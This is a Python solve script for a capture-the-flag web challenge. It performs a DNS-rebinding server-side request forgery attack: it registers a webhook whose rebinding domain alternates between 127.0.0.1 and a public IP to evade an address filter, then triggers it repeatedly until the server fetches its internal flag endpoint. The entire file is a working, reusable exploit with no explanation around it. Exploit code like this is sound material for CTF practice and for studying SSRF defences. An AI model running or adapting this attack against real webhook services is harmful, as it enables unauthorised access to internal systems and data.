import requests
import time
import sys

TARGET_HOST = "http://chall.0xfun.org:16963"
# 127.0.0.1 (Target) and 8.8.8.8 (Bypass)
REBIND_DOMAIN = "7f000001.08080808.rbndr.us"
PAYLOAD_URL = f"http://{REBIND_DOMAIN}:5001/flag"

def solve():
    # 1. Register Webhook
    print(f"[*] Registering: {PAYLOAD_URL}")
    webhook_id = None
    while not webhook_id:
        try:
            res = requests.post(f"{TARGET_HOST}/register", data={"url": PAYLOAD_URL}, timeout=3)
            if res.status_code == 200:
                webhook_id = res.json()['id']
                print(f"\n[+] ID: {webhook_id}")
            else:
                sys.stdout.write(".")
                sys.stdout.flush()
                time.sleep(0.5)
        except:
            pass

    # 2. Attack / Trigger
    print(f"[*] Attacking...")
    while True:
        try:
            res = requests.post(f"{TARGET_HOST}/trigger", data={"id": webhook_id}, timeout=3)
            response_text = res.json().get('response', '')
            
            if "0xfun{" in response_text:
                print(f"\n\n[+] FLAG RETRIEVED:\n{response_text}\n")
                break
            elif res.status_code == 400:
                sys.stdout.write(".") # Blocked by filter
            else:
                sys.stdout.write("!") # Hit public IP
            sys.stdout.flush()
        except:
            pass
        time.sleep(0.1)

if __name__ == "__main__":
    solve()